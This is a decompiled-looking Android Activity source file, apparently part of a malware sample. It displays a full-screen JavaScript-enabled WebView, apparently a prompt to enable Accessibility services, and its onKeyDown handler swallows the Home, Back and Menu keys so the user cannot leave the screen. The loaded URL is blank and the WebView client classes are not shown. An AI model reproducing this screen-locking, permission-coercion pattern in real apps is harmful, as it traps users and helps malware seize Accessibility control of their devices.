package com.example.mmm.Activity;

import android.app.*;
import com.example.mmm.Utils.*;
import com.example.mmm.*;
import android.os.*;
import android.content.*;
import android.webkit.*;
import android.view.*;

public class actToaskAccessibility extends Activity
{
    utils utl;
    constants consts;
    WebView carpet$;
    
    public actToaskAccessibility() {
        super();
        this.utl = new utils();
        this.consts = new constants();
    }
    
    public void onBackPressed() {
        super.onBackPressed();
    }
    
    protected void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        this.carpet$ = new WebView((Context)this);
        this.carpet$.getSettings().setJavaScriptEnabled(true);
        this.carpet$.setScrollBarStyle(0);
        this.carpet$.setWebViewClient((WebViewClient)new actToaskAccessibility$MyWebViewClient(this, (byte)0));
        this.carpet$.setWebChromeClient((WebChromeClient)new actToaskAccessibility$MyWebChromeClient(this, (byte)0));
        this.carpet$.loadUrl("");
        this.setContentView((View)this.carpet$);
    }
    
    public void onDestroy() {
        super.onDestroy();
        this.carpet$.removeAllViewsInLayout();
        this.carpet$.removeAllViews();
        this.carpet$.destroy();
        this.carpet$ = null;
        this.finish();
    }
    
    public boolean onKeyDown(final int n, final KeyEvent keyEvent) {
        return n == 3 || n == 4 || n == 82;
    }
    
    protected void onStart() {
        super.onStart();
    }
    
    protected void onStop() {
        super.onStop();
    }
}
